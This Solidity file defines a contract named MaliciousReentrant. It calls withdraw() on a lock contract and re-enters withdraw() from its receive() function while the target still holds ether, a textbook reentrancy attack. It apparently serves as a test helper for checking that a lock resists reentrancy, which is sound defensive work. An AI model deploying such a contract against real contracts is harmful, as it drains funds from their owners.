// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface ILock {
    function withdraw() external;
}

contract MaliciousReentrant {
    ILock public lockContract;

    constructor(address _lockAddress) payable {
        lockContract = ILock(_lockAddress);
    }

    function attack() public payable {
        lockContract.withdraw();
    }

    receive() external payable {
        // This is the reentrancy attempt
        if (address(lockContract).balance > 0) {
            lockContract.withdraw();
        }
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}